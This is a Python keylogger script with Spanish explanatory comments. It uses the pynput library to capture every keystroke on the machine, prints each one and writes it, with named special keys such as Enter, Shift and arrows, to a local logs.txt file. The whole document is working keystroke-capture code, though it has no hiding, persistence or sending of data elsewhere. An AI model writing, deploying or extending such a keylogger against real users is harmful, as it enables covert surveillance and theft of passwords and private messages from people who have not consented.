from pynput import keyboard
#Esto lo que hace es abrir el fichero de texto donde se guardan todos los datos
file = open("logs.txt", "r")
content = file.readlines()
#Esta función contiene una serie de condiciones que dependiendo de la tecla que pulse
# se guarda en un archivo de texto que hemos especificado antes
def on_press(key):
    try:
        print(str(key.char)+" pressed")
        content.append(str(key.char)+"\n")
        file = open("logs.txt", "w")
        file.writelines(content)
    except AttributeError:
        if str(key) == "Key.backspace":
            content.append("Backspace\n")
            file = open("logs.txt", "w")
            file.writelines(content) #Como se puede observar tenemos el metodo write lines que lo que hace es
                                     # Escribir en el fichero
        elif str(key) == "Key.space":
            content.append("Space\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.ctrl_l":
            content.append("Left CTRL\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.shift":
            content.append("Left Shift\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.enter":
            content.append("Enter\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.shift_r":
            content.append("Right Shift\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.alt_l":
            content.append("Left ALT\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.alt_gr":
            content.append("ALT GR\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.left":
            content.append("Left Arrow\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.right":
            content.append("Right Arrow\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.up":
            content.append("Up Arrow\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.down":
            content.append("Down Arrow\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.cmd":
            content.append("Windows Button\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.caps_lock":
            content.append("Caps Lock\n")
            file = open("logs.txt", "w")
            file.writelines(content)
        else:
            content.append(str(key)+"\n")
            file = open("logs.txt", "w")
            file.writelines(content)

with keyboard.Listener(on_press=on_press) as listener: #cuando presiona se activa la función
    listener.join()

